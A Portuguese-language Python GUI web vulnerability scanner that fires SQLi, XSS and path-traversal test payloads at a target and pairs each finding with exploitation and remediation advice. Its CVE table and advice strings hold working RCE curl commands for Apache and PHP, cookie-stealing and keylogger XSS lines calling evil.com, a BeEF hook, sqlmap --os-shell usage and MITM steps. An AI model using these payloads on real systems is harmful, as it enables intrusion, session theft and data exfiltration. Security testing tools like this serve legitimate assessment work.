#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║        VULNSCAN PRO - Scanner de Vulnerabilidades            ║
║     Barra de Progresso 0-100% | CVE Links | Relatório HTML   ║
╚══════════════════════════════════════════════════════════════╝
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import requests
import socket
import ssl
import json
import re
import os
import time
import urllib.parse
from datetime import datetime
from collections import defaultdict
import warnings
import html as html_module
import platform


from bs4 import BeautifulSoup
import dns.resolver
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings('ignore')
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==================== CVE DATABASE ====================

CVE_DATABASE = {
    'jquery': {
        'versions_affected': '< 3.5.0',
        'cves': [
            {
                'id': 'CVE-2020-11022',
                'score': 6.1,
                'description': 'XSS via htmlPrefilter regex em jQuery.html()',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2020-11022',
                'exploit': 'Injetar HTML malicioso via .html() ou .append():\n'
                           '$(element).html("<img src=x onerror=alert(document.cookie)>")',
            },
            {
                'id': 'CVE-2020-11023',
                'score': 6.1,
                'description': 'XSS via opção regex em jQuery htmlPrefilter',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2020-11023',
                'exploit': 'Mesmo vetor do CVE-2020-11022 com payloads diferentes.',
            },
            {
                'id': 'CVE-2019-11358',
                'score': 6.1,
                'description': 'Prototype Pollution em jQuery.extend()',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2019-11358',
                'exploit': '$.extend(true, {}, JSON.parse(\'{"__proto__":{"isAdmin":true}}\'))',
            },
            {
                'id': 'CVE-2015-9251',
                'score': 6.1,
                'description': 'XSS quando respostas text/javascript via cross-domain ajax',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2015-9251',
                'exploit': 'AJAX cross-domain com dataType incorreto',
            },
        ]
    },
    'wordpress': {
        'versions_affected': 'Várias versões',
        'cves': [
            {
                'id': 'CVE-2024-6307',
                'score': 8.8,
                'description': 'WordPress Core - Stored XSS via comentários HTML',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2024-6307',
                'exploit': 'Inserir payload XSS em comentário HTML processado pelo wp-includes',
            },
            {
                'id': 'CVE-2023-22622',
                'score': 5.3,
                'description': 'WordPress Core - Information Disclosure via wp-mail.php',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2023-22622',
                'exploit': 'Acessar /wp-mail.php para obter informações internas',
            },
            {
                'id': 'CVE-2023-5561',
                'score': 5.3,
                'description': 'WordPress Core - User Enumeration via XMLRPC multicall',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2023-5561',
                'exploit': 'xmlrpc.php system.multicall para brute force amplificado',
            },
            {
                'id': 'CVE-2022-21661',
                'score': 7.5,
                'description': 'WordPress Core - SQL Injection via WP_Query',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2022-21661',
                'exploit': 'Explorar WP_Query com parâmetros manipulados',
            },
        ]
    },
    'apache': {
        'versions_affected': 'Várias versões',
        'cves': [
            {
                'id': 'CVE-2021-41773',
                'score': 9.8,
                'description': 'Apache 2.4.49 - Path Traversal + RCE',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
                'exploit': 'curl "https://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"\n'
                           'curl -d \'echo;id\' "https://target/cgi-bin/.%2e/.%2e/.%2e/bin/sh"',
            },
            {
                'id': 'CVE-2021-42013',
                'score': 9.8,
                'description': 'Apache 2.4.50 - Bypass do fix CVE-2021-41773',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2021-42013',
                'exploit': 'curl "https://target/.%%32%65/.%%32%65/.%%32%65/etc/passwd"',
            },
            {
                'id': 'CVE-2023-25690',
                'score': 9.8,
                'description': 'Apache mod_proxy HTTP Request Smuggling',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2023-25690',
                'exploit': 'Request smuggling via mod_proxy mal configurado',
            },
        ]
    },
    'nginx': {
        'versions_affected': 'Várias versões',
        'cves': [
            {
                'id': 'CVE-2021-23017',
                'score': 9.4,
                'description': 'Nginx DNS Resolver off-by-one heap write',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2021-23017',
                'exploit': 'DNS response manipulation para overflow no resolver',
            },
            {
                'id': 'CVE-2022-41741',
                'score': 7.8,
                'description': 'Nginx mp4 module memory corruption',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2022-41741',
                'exploit': 'MP4 file especialmente crafted para corrupção de memória',
            },
        ]
    },
    'php': {
        'versions_affected': 'Várias versões',
        'cves': [
            {
                'id': 'CVE-2024-4577',
                'score': 9.8,
                'description': 'PHP CGI Argument Injection - RCE',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2024-4577',
                'exploit': 'curl "https://target/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input" --data "<?php system(\'id\'); ?>"',
            },
            {
                'id': 'CVE-2023-3824',
                'score': 9.8,
                'description': 'PHP Buffer overflow em phar_dir_read()',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2023-3824',
                'exploit': 'PHAR file malicioso para buffer overflow',
            },
        ]
    },
    'bootstrap': {
        'versions_affected': '< 4.3.1',
        'cves': [
            {
                'id': 'CVE-2019-8331',
                'score': 6.1,
                'description': 'Bootstrap XSS via tooltip/popover data-template',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2019-8331',
                'exploit': '<div data-toggle="tooltip" data-template="<img src=x onerror=alert(1)>">',
            },
            {
                'id': 'CVE-2018-14040',
                'score': 6.1,
                'description': 'Bootstrap XSS via collapse data-parent',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2018-14040',
                'exploit': 'Manipular data-parent attribute com XSS payload',
            },
        ]
    },
    'xmlrpc': {
        'versions_affected': 'WordPress XML-RPC',
        'cves': [
            {
                'id': 'CVE-2020-28036',
                'score': 9.8,
                'description': 'WordPress XML-RPC - Bypass de autenticação',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2020-28036',
                'exploit': 'system.multicall para bypass de rate limiting:\n'
                           'Testar 1000+ senhas em uma única request HTTP',
            },
        ]
    },
    'ssl_tls': {
        'versions_affected': 'SSLv3, TLSv1.0, TLSv1.1',
        'cves': [
            {
                'id': 'CVE-2014-3566',
                'score': 3.4,
                'description': 'POODLE - Padding Oracle On Downgraded Legacy Encryption (SSLv3)',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2014-3566',
                'exploit': 'Forçar downgrade para SSLv3 e explorar padding oracle',
            },
            {
                'id': 'CVE-2011-3389',
                'score': 4.3,
                'description': 'BEAST - Browser Exploit Against SSL/TLS (TLSv1.0)',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2011-3389',
                'exploit': 'Man-in-the-middle via chosen-plaintext attack em CBC mode',
            },
            {
                'id': 'CVE-2016-2183',
                'score': 7.5,
                'description': 'SWEET32 - Birthday attack em 3DES/Blowfish (64-bit block)',
                'url': 'https://nvd.nist.gov/vuln/detail/CVE-2016-2183',
                'exploit': 'Capturar ~32GB de tráfego para decifrar blocos via birthday attack',
            },
        ]
    },
    'cors': {
        'versions_affected': 'Misconfiguration',
        'cves': [
            {
                'id': 'CWE-942',
                'score': 7.5,
                'description': 'Overly Permissive Cross-domain Whitelist (CORS)',
                'url': 'https://cwe.mitre.org/data/definitions/942.html',
                'exploit': 'JavaScript de domínio malicioso pode ler dados autenticados',
            },
        ]
    },
    'sqli': {
        'versions_affected': 'Aplicação Web',
        'cves': [
            {
                'id': 'CWE-89',
                'score': 9.8,
                'description': 'SQL Injection - Improper Neutralization of Special Elements',
                'url': 'https://cwe.mitre.org/data/definitions/89.html',
                'exploit': 'OWASP Top 1: sqlmap, manual injection, error/blind/time-based',
            },
        ]
    },
    'xss': {
        'versions_affected': 'Aplicação Web',
        'cves': [
            {
                'id': 'CWE-79',
                'score': 8.2,
                'description': 'Cross-site Scripting (XSS) - Reflected/Stored/DOM',
                'url': 'https://cwe.mitre.org/data/definitions/79.html',
                'exploit': 'OWASP Top 7: XSS para roubo de sessão, defacement, phishing',
            },
        ]
    },
    'lfi': {
        'versions_affected': 'Aplicação Web',
        'cves': [
            {
                'id': 'CWE-22',
                'score': 9.1,
                'description': 'Path Traversal - Improper Limitation of Pathname',
                'url': 'https://cwe.mitre.org/data/definitions/22.html',
                'exploit': 'LFI para ler arquivos, código fonte, credenciais do sistema',
            },
        ]
    },
    'csrf': {
        'versions_affected': 'Aplicação Web',
        'cves': [
            {
                'id': 'CWE-352',
                'score': 6.5,
                'description': 'Cross-Site Request Forgery (CSRF)',
                'url': 'https://cwe.mitre.org/data/definitions/352.html',
                'exploit': 'Forjar requests autenticados a partir de site malicioso',
            },
        ]
    },
    'clickjacking': {
        'versions_affected': 'Aplicação Web',
        'cves': [
            {
                'id': 'CWE-1021',
                'score': 4.7,
                'description': 'Improper Restriction of Rendered UI Layers (Clickjacking)',
                'url': 'https://cwe.mitre.org/data/definitions/1021.html',
                'exploit': 'Sobrepor iframe transparente para capturar cliques do usuário',
            },
        ]
    },
}


def get_cves_for_tech(tech_name):
    """Busca CVEs relacionadas a uma tecnologia."""
    key = tech_name.lower().replace('.js', '').replace(' ', '_').split('/')[0]
    results = []
    for db_key, data in CVE_DATABASE.items():
        if db_key in key or key in db_key:
            results.extend(data['cves'])
    return results


def get_cves_for_category(category):
    """Busca CVEs por categoria de vulnerabilidade."""
    mapping = {
        'SQL Injection': 'sqli',
        'XSS': 'xss',
        'Directory Traversal': 'lfi',
        'CSRF': 'csrf',
        'Clickjacking': 'clickjacking',
        'CORS': 'cors',
        'SSL/TLS': 'ssl_tls',
        'WordPress': 'wordpress',
    }
    key = mapping.get(category, '')
    if key and key in CVE_DATABASE:
        return CVE_DATABASE[key]['cves']
    return []


def format_cve_info(cves):
    """Formata informações de CVE para exibição."""
    if not cves:
        return ""
    text = "\n\n📌 CVE RELACIONADAS:\n" + "─" * 40 + "\n"
    for cve in cves:
        text += (f"\n  🔹 {cve['id']} (CVSS: {cve['score']})\n"
                 f"     {cve['description']}\n"
                 f"     🔗 {cve['url']}\n")
        if 'exploit' in cve:
            text += f"     💀 {cve['exploit'][:100]}...\n"
    text += "\n" + "─" * 40
    return text


# ==================== CLASSE VULNERABILIDADE ====================

class Vulnerability:
    def __init__(self, name, severity, description, evidence,
                 exploit_info, remediation, category,
                 cvss_score=0.0, cves=None):
        self.name = name
        self.severity = severity
        self.description = description
        self.evidence = evidence
        self.exploit_info = exploit_info
        self.remediation = remediation
        self.category = category
        self.cvss_score = cvss_score
        self.cves = cves or []
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Auto buscar CVEs se não fornecidas
        if not self.cves:
            self.cves = get_cves_for_category(category)


# ==================== SCANNER PRINCIPAL ====================

class VulnerabilityScanner:
    def __init__(self, callback=None, progress_callback=None):
        self.vulnerabilities = []
        self.scan_info = {}
        self.callback = callback
        self.progress_callback = progress_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        })
        self.session.verify = False
        self.technologies = []
        self.stop_scan = False
        self.total_modules = 0
        self.current_module = 0

    def log(self, message, level="INFO"):
        if self.callback:
            self.callback(f"[{level}] {message}")

    def update_progress(self, module_index, total):
        pct = int((module_index / total) * 100)
        if self.progress_callback:
            self.progress_callback(pct, total, module_index)

    def add_vuln(self, vuln):
        self.vulnerabilities.append(vuln)
        if self.callback:
            icon = {'CRÍTICA':'🔴','ALTA':'🟠','MÉDIA':'🟡','BAIXA':'🟢','INFO':'🔵'}.get(vuln.severity, '⚪')
            cve_text = ""
            if vuln.cves:
                cve_ids = [c['id'] for c in vuln.cves[:2]]
                cve_text = f" | CVE: {', '.join(cve_ids)}"
            self.callback(f"[VULN] {icon} [{vuln.severity}] {vuln.name}{cve_text}")

    def normalize_url(self, target):
        target = target.strip()
        if not target.startswith(('http://', 'https://')):
            try:
                requests.get(f'https://{target}', timeout=5, verify=False)
                return f'https://{target}'
            except Exception:
                return f'http://{target}'
        return target

    def full_scan(self, target):
        self.vulnerabilities = []
        self.stop_scan = False

        url = self.normalize_url(target)
        domain = urllib.parse.urlparse(url).hostname
        self.scan_info = {
            'target': target, 'url': url, 'domain': domain,
            'start_time': datetime.now(),
            'scan_date': datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        }

        self.log(f"{'='*60}")
        self.log(f"🎯 Alvo: {target}")
        self.log(f"🔗 URL: {url}")
        self.log(f"🌐 Domínio: {domain}")
        self.log(f"⏰ Início: {self.scan_info['scan_date']}")
        self.log(f"{'='*60}")

        scan_modules = [
            ("🔍 Reconhecimento e Info", self.scan_reconnaissance),
            ("🔒 Análise SSL/TLS", self.scan_ssl_tls),
            ("📋 Security Headers", self.scan_security_headers),
            ("🍪 Segurança de Cookies", self.scan_cookies),
            ("💉 SQL Injection (SQLi)", self.scan_sql_injection),
            ("📜 Cross-Site Scripting (XSS)", self.scan_xss),
            ("📂 Directory Traversal / LFI", self.scan_directory_traversal),
            ("📁 Arquivos Sensíveis", self.scan_sensitive_files),
            ("🔧 Configuração do Servidor", self.scan_server_config),
            ("🔄 CORS Misconfiguration", self.scan_cors),
            ("🔀 Open Redirect", self.scan_open_redirect),
            ("📡 Enumeração de Subdomínios", self.scan_subdomains),
            ("🚪 Port Scan", self.scan_common_ports),
            ("🤖 Robots.txt e Sitemap", self.scan_robots_sitemap),
            ("📝 Formulários e Inputs", self.scan_forms),
            ("📊 Detecção de Tecnologias", self.scan_technologies),
            ("⚡ Clickjacking", self.scan_clickjacking),
            ("🔑 Information Disclosure", self.scan_info_disclosure),
            ("📧 Email Harvesting", self.scan_email_harvest),
            ("🛡️ WAF Detection", self.scan_waf_detection),
            ("📦 Componentes Vulneráveis + CVE", self.scan_vulnerable_components),
            ("🌐 DNS / SPF / DMARC", self.scan_dns),
            ("⚙️ HTTP Methods", self.scan_http_methods),
            ("🔓 CSRF Detection", self.scan_csrf),
            ("📱 Security.txt", self.scan_security_txt),
        ]

        self.total_modules = len(scan_modules)
        for i, (name, func) in enumerate(scan_modules):
            if self.stop_scan:
                self.log("⛔ Scan interrompido pelo usuário!")
                break

            self.current_module = i + 1
            self.update_progress(i, self.total_modules)

            self.log(f"\n{'─'*55}")
            self.log(f"📌 [{i+1}/{self.total_modules}] {name}")
            self.log(f"{'─'*55}")

            try:
                func(url, domain)
            except Exception as e:
                self.log(f"⚠️ Erro em {name}: {str(e)}", "ERROR")

        # 100%
        self.update_progress(self.total_modules, self.total_modules)

        self.scan_info['end_time'] = datetime.now()
        duration = self.scan_info['end_time'] - self.scan_info['start_time']
        self.scan_info['duration'] = str(duration).split('.')[0]
        self.scan_info['ip'] = self.scan_info.get('ip', 'N/A')
        self.scan_info['server'] = self.scan_info.get('server', 'N/A')

        self.log(f"\n{'='*60}")
        self.log(f"✅ SCAN COMPLETO!")
        self.log(f"⏱️  Duração: {self.scan_info['duration']}")
        self.log(f"🔍 Vulnerabilidades: {len(self.vulnerabilities)}")

        sc = defaultdict(int)
        for v in self.vulnerabilities:
            sc[v.severity] += 1
        for s in ['CRÍTICA','ALTA','MÉDIA','BAIXA','INFO']:
            if sc[s] > 0:
                self.log(f"   {'🔴🟠🟡🟢🔵'[['CRÍTICA','ALTA','MÉDIA','BAIXA','INFO'].index(s)]} {s}: {sc[s]}")

        total_cves = sum(len(v.cves) for v in self.vulnerabilities)
        self.log(f"📌 CVE referenciadas: {total_cves}")
        self.log(f"{'='*60}")

        return self.vulnerabilities

    # ========== MÓDULOS DE SCAN ==========

    def scan_reconnaissance(self, url, domain):
        try:
            response = self.session.get(url, timeout=15)
            self.scan_info['status_code'] = response.status_code
            self.scan_info['server'] = response.headers.get('Server', 'N/A')
            self.scan_info['response_time'] = response.elapsed.total_seconds()

            self.log(f"  Status: {response.status_code} | Server: {self.scan_info['server']}")
            self.log(f"  Response Time: {self.scan_info['response_time']:.2f}s")

            try:
                ip = socket.gethostbyname(domain)
                self.scan_info['ip'] = ip
                self.log(f"  IP: {ip}")
            except Exception:
                self.scan_info['ip'] = 'N/A'

            server = response.headers.get('Server', '')
            if server and re.search(r'[\d]+\.[\d]+', server):
                server_name = server.split('/')[0].lower() if '/' in server else server.lower()
                cves = get_cves_for_tech(server_name)
                self.add_vuln(Vulnerability(
                    name="Server Version Disclosure",
                    severity="BAIXA",
                    description=f"O servidor expõe sua versão: {server}",
                    evidence=f"Header Server: {server}",
                    exploit_info=f"Buscar CVE específicas:\n"
                                 f"  searchsploit {server_name}\n"
                                 f"  nmap --script vuln -p 80,443 {domain}"
                                 + format_cve_info(cves),
                    remediation="Ocultar versão:\n"
                                "- Apache: ServerTokens Prod\n"
                                "- Nginx: server_tokens off;",
                    category="Info Disclosure", cvss_score=3.7, cves=cves
                ))

            powered = response.headers.get('X-Powered-By', '')
            if powered:
                tech_name = powered.split('/')[0].lower()
                cves = get_cves_for_tech(tech_name)
                self.add_vuln(Vulnerability(
                    name="X-Powered-By Exposto",
                    severity="BAIXA",
                    description=f"Tecnologia revelada: {powered}",
                    evidence=f"X-Powered-By: {powered}",
                    exploit_info=f"Buscar exploits para {powered}:\n"
                                 f"  searchsploit {tech_name}"
                                 + format_cve_info(cves),
                    remediation="PHP: expose_php=Off\nExpress: app.disable('x-powered-by')",
                    category="Info Disclosure", cvss_score=3.7, cves=cves
                ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_ssl_tls(self, url, domain):
        if not url.startswith('https'):
            self.add_vuln(Vulnerability(
                name="Site sem HTTPS",
                severity="ALTA",
                description="Sem HTTPS - dados em texto puro",
                evidence=f"URL: {url}",
                exploit_info="Ataques MITM:\n"
                             "  1. sslstrip -l 8080\n"
                             "  2. arpspoof -i eth0 -t GATEWAY TARGET\n"
                             "  3. Wireshark: filtro http.request.method==POST\n"
                             "  4. mitmproxy para interceptar/modificar tráfego",
                remediation="1. Let's Encrypt: certbot --apache / certbot --nginx\n"
                            "2. Redirect HTTP->HTTPS (301)\n"
                            "3. HSTS header\n"
                            "4. HTTPS em todos os recursos",
                category="SSL/TLS", cvss_score=7.5
            ))
            return

        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    protocol = ssock.version()
                    cipher = ssock.cipher()

                    self.log(f"  Protocolo: {protocol}")
                    self.log(f"  Cipher: {cipher[0] if cipher else 'N/A'}")

                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (not_after - datetime.now()).days

                    if days_left < 0:
                        self.add_vuln(Vulnerability(
                            name="Certificado SSL Expirado",
                            severity="CRÍTICA",
                            description=f"Expirou há {abs(days_left)} dias ({cert['notAfter']})",
                            evidence=f"notAfter: {cert['notAfter']}",
                            exploit_info="MITM sem alertas em clientes legados\ncertbot renew",
                            remediation="certbot renew --force-renewal",
                            category="SSL/TLS", cvss_score=9.1
                        ))
                    elif days_left < 30:
                        self.add_vuln(Vulnerability(
                            name=f"Certificado Expira em {days_left} dias",
                            severity="MÉDIA",
                            description=f"Expira em {cert['notAfter']}",
                            evidence=f"Restam {days_left} dias",
                            exploit_info="Indisponibilidade iminente",
                            remediation="certbot renew\nConfigurar cron para auto-renovação",
                            category="SSL/TLS", cvss_score=4.0
                        ))

                    if protocol in ['SSLv2','SSLv3','TLSv1','TLSv1.1']:
                        tls_cves = CVE_DATABASE.get('ssl_tls', {}).get('cves', [])
                        self.add_vuln(Vulnerability(
                            name=f"Protocolo Fraco: {protocol}",
                            severity="ALTA",
                            description=f"{protocol} é inseguro e vulnerável",
                            evidence=f"Protocolo negociado: {protocol}",
                            exploit_info=f"Ataques conhecidos contra {protocol}:\n"
                                         f"  testssl.sh {domain}\n"
                                         f"  nmap --script ssl-enum-ciphers -p 443 {domain}"
                                         + format_cve_info(tls_cves),
                            remediation="Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1\n"
                                        "Nginx: ssl_protocols TLSv1.2 TLSv1.3;",
                            category="SSL/TLS", cvss_score=7.4, cves=tls_cves
                        ))
        except ssl.SSLCertVerificationError as e:
            self.add_vuln(Vulnerability(
                name="Certificado SSL Inválido",
                severity="ALTA",
                description=f"Certificado não confiável: {str(e)[:100]}",
                evidence=str(e)[:200],
                exploit_info="Facilita ataques MITM sem alertas",
                remediation="Obter certificado de CA confiável (Let's Encrypt)",
                category="SSL/TLS", cvss_score=7.5
            ))
        except Exception as e:
            self.log(f"  ⚠️ {str(e)}")

    def scan_security_headers(self, url, domain):
        try:
            resp = self.session.get(url, timeout=15)
            headers = {k.lower(): v for k, v in resp.headers.items()}

            checks = {
                'strict-transport-security': {
                    'name': 'HSTS Ausente', 'sev': 'ALTA', 'cvss': 6.5,
                    'exp': 'sslstrip força downgrade HTTPS→HTTP:\n  sslstrip -l 8080',
                    'fix': 'Header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n'
                           'Apache: Header always set Strict-Transport-Security ...\n'
                           'Nginx: add_header Strict-Transport-Security ... always;'
                },
                'x-content-type-options': {
                    'name': 'X-Content-Type-Options Ausente', 'sev': 'MÉDIA', 'cvss': 5.3,
                    'exp': 'MIME sniffing: arquivo .jpg com código JS executado como script',
                    'fix': 'Header: X-Content-Type-Options: nosniff'
                },
                'x-frame-options': {
                    'name': 'X-Frame-Options Ausente', 'sev': 'MÉDIA', 'cvss': 4.7,
                    'exp': 'Clickjacking via iframe transparente',
                    'fix': 'Header: X-Frame-Options: DENY ou SAMEORIGIN'
                },
                'content-security-policy': {
                    'name': 'CSP Ausente', 'sev': 'MÉDIA', 'cvss': 5.8,
                    'exp': 'Sem proteção contra XSS e injection de scripts',
                    'fix': "Header: Content-Security-Policy: default-src 'self'; script-src 'self'"
                },
                'referrer-policy': {
                    'name': 'Referrer-Policy Ausente', 'sev': 'BAIXA', 'cvss': 3.1,
                    'exp': 'URLs com tokens/dados sensíveis vazam via Referer header',
                    'fix': 'Header: Referrer-Policy: strict-origin-when-cross-origin'
                },
                'permissions-policy': {
                    'name': 'Permissions-Policy Ausente', 'sev': 'BAIXA', 'cvss': 3.5,
                    'exp': 'Iframes podem acessar câmera, microfone, geolocalização',
                    'fix': 'Header: Permissions-Policy: camera=(), microphone=(), geolocation=()'
                },
            }

            for header, info in checks.items():
                if header not in headers:
                    self.add_vuln(Vulnerability(
                        name=info['name'], severity=info['sev'],
                        description=f"Header '{header}' não encontrado",
                        evidence=f"Ausente: {header}",
                        exploit_info=info['exp'],
                        remediation=info['fix'],
                        category="Security Headers", cvss_score=info['cvss']
                    ))
                else:
                    self.log(f"  ✅ {header}: presente")
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_cookies(self, url, domain):
        try:
            resp = self.session.get(url, timeout=15)
            for cookie in resp.cookies:
                issues = []
                if not cookie.secure:
                    issues.append("Sem Secure")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("Sem HttpOnly")
                if not cookie.get_nonstandard_attr('SameSite'):
                    issues.append("Sem SameSite")
                if issues:
                    self.add_vuln(Vulnerability(
                        name=f"Cookie Inseguro: {cookie.name}",
                        severity="MÉDIA",
                        description=f"Problemas: {', '.join(issues)}",
                        evidence=f"Cookie: {cookie.name}\n{', '.join(issues)}",
                        exploit_info="Sem HttpOnly → document.cookie via XSS\n"
                                     "Sem Secure → interceptável via MITM\n"
                                     "Sem SameSite → vulnerável a CSRF",
                        remediation="Set-Cookie: nome=valor; Secure; HttpOnly; SameSite=Strict; Path=/",
                        category="Cookies", cvss_score=5.4
                    ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_sql_injection(self, url, domain):
        self.log("  Testando SQL Injection...")
        payloads = [("'","aspa"), ("' OR '1'='1","boolean"),
                    ("1' ORDER BY 100--","order"), ("' AND SLEEP(3)--","time"),
                    ("' UNION SELECT NULL--","union"), ("admin'--","auth_bypass")]
        errors = ['sql syntax','mysql','sqlite','postgresql','oracle','syntax error',
                  'unclosed quotation','ORA-','sqlstate','mysql_fetch',
                  'you have an error in your sql','warning: mysql',
                  'microsoft sql','odbc','jdbc']

        test_params = ['id','page','search','q','user','cat','p','item']
        sqli_cves = CVE_DATABASE.get('sqli', {}).get('cves', [])
        found = False

        for param in test_params[:6]:
            if self.stop_scan: return
            for payload, ptype in payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    start = time.time()
                    resp = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start
                    text = resp.text.lower()

                    for err in errors:
                        if err in text:
                            self.add_vuln(Vulnerability(
                                name=f"SQL Injection ({ptype})",
                                severity="CRÍTICA",
                                description=f"SQLi no parâmetro '{param}'",
                                evidence=f"URL: {test_url}\nPayload: {payload}\nErro: {err}",
                                exploit_info=f"Tipo: {ptype}\n\n"
                                             f"sqlmap automático:\n"
                                             f"  sqlmap -u \"{url}?{param}=1\" --dbs --batch\n"
                                             f"  sqlmap -u \"{url}?{param}=1\" --tables -D database --batch\n"
                                             f"  sqlmap -u \"{url}?{param}=1\" --dump -T users --batch\n"
                                             f"  sqlmap -u \"{url}?{param}=1\" --os-shell --batch\n\n"
                                             f"Manual:\n"
                                             f"  ?{param}=' UNION SELECT username,password FROM users--\n"
                                             f"  ?{param}=' UNION SELECT table_name,NULL FROM information_schema.tables--"
                                             + format_cve_info(sqli_cves),
                                remediation="1. Prepared Statements (OBRIGATÓRIO):\n"
                                            "   PHP: $stmt=$pdo->prepare('SELECT * FROM t WHERE id=?');\n"
                                            "        $stmt->execute([$id]);\n"
                                            "   Python: cursor.execute('SELECT * FROM t WHERE id=%s', (id,))\n"
                                            "   Java: PreparedStatement ps=conn.prepareStatement('...WHERE id=?');\n"
                                            "   Node: db.query('SELECT * FROM t WHERE id=$1', [id])\n\n"
                                            "2. ORM (SQLAlchemy, Hibernate, Eloquent)\n"
                                            "3. Validar/sanitizar entrada\n"
                                            "4. WAF (ModSecurity)\n"
                                            "5. Princípio de menor privilégio no DB",
                                category="SQL Injection", cvss_score=9.8, cves=sqli_cves
                            ))
                            found = True
                            break

                    if 'SLEEP' in payload and elapsed > 3:
                        self.add_vuln(Vulnerability(
                            name="SQL Injection Time-Based",
                            severity="CRÍTICA",
                            description=f"SQLi time-based em '{param}'",
                            evidence=f"URL: {test_url}\nTempo: {elapsed:.1f}s (esperado >3s)",
                            exploit_info=f"sqlmap -u \"{url}?{param}=1\" --technique=T --dbs --batch"
                                         + format_cve_info(sqli_cves),
                            remediation="Usar Prepared Statements em todas as queries",
                            category="SQL Injection", cvss_score=9.8, cves=sqli_cves
                        ))
                        found = True
                except Exception:
                    continue

        if not found:
            self.log("  ✅ Nenhum SQLi óbvio detectado")

    def scan_xss(self, url, domain):
        self.log("  Testando XSS...")
        payloads = ['<script>alert("XSS")</script>',
                    '"><img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    "'-alert(1)-'",
                    '<body onload=alert(1)>',
                    '<marquee onstart=alert(1)>']
        params = ['q','search','s','query','name','page','msg','text','input']
        xss_cves = CVE_DATABASE.get('xss', {}).get('cves', [])
        found = False

        for param in params:
            if self.stop_scan: return
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    resp = self.session.get(test_url, timeout=10)
                    if payload in resp.text:
                        self.add_vuln(Vulnerability(
                            name="XSS Refletido",
                            severity="ALTA",
                            description=f"XSS no parâmetro '{param}'",
                            evidence=f"URL: {test_url}\nPayload refletido sem encode",
                            exploit_info=f"Payload: {payload}\n\n"
                                         "Exploração:\n"
                                         "1. Roubo de sessão:\n"
                                         f"   {url}?{param}=<script>new Image().src='https://evil.com/?c='+document.cookie</script>\n\n"
                                         "2. Keylogger:\n"
                                         f"   <script>document.onkeypress=function(e){{new Image().src='https://evil.com/k?='+e.key}}</script>\n\n"
                                         "3. Redirecionamento:\n"
                                         f"   <script>document.location='https://evil.com/phishing'</script>\n\n"
                                         "4. BeEF Hook:\n"
                                         f"   <script src='https://attacker.com/hook.js'></script>"
                                         + format_cve_info(xss_cves),
                            remediation="1. Output Encoding (OBRIGATÓRIO):\n"
                                        "   PHP: htmlspecialchars($x, ENT_QUOTES, 'UTF-8')\n"
                                        "   Python: html.escape(x)\n"
                                        "   Java: ESAPI.encoder().encodeForHTML(x)\n"
                                        "   JS: DOMPurify.sanitize(x)\n\n"
                                        "2. Content-Security-Policy header\n"
                                        "3. Framework com auto-escaping (React, Angular, Vue)\n"
                                        "4. Validar input (whitelist)\n"
                                        "5. HttpOnly nos cookies",
                            category="XSS", cvss_score=8.2, cves=xss_cves
                        ))
                        found = True
                        break
                except Exception:
                    continue

        if not found:
            self.log("  ✅ Nenhum XSS óbvio detectado")

    def scan_directory_traversal(self, url, domain):
        self.log("  Testando LFI / Directory Traversal...")
        payloads = [("../../../etc/passwd","root:"),
                    ("....//....//....//etc/passwd","root:"),
                    ("..%2f..%2f..%2fetc%2fpasswd","root:"),
                    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","localhost")]
        params = ['file','page','path','doc','include','view','template','lang']
        lfi_cves = CVE_DATABASE.get('lfi', {}).get('cves', [])

        for param in params[:6]:
            if self.stop_scan: return
            for payload, indicator in payloads:
                try:
